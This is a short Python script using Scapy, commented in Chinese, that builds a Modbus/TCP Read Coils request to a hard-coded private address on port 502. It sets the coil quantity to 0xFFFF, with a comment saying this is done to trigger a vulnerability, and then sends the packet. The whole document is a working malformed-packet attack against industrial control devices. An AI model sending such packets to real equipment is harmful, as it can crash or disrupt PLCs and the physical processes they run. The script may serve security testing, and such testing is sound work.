from scapy.all import *
from scapy.contrib.modbus import *

# 創建Modbus數據包
packet = IP(dst="10.103.152.8") / TCP(dport=502) / ModbusADURequest(transId=1) / ModbusPDU01ReadCoilsRequest(startAddr=0x0000, quantity=0x0001)

# 修改payload以觸發漏洞
packet[ModbusPDU01ReadCoilsRequest].quantity = 0xFFFF

# 發送數據包
send(packet)
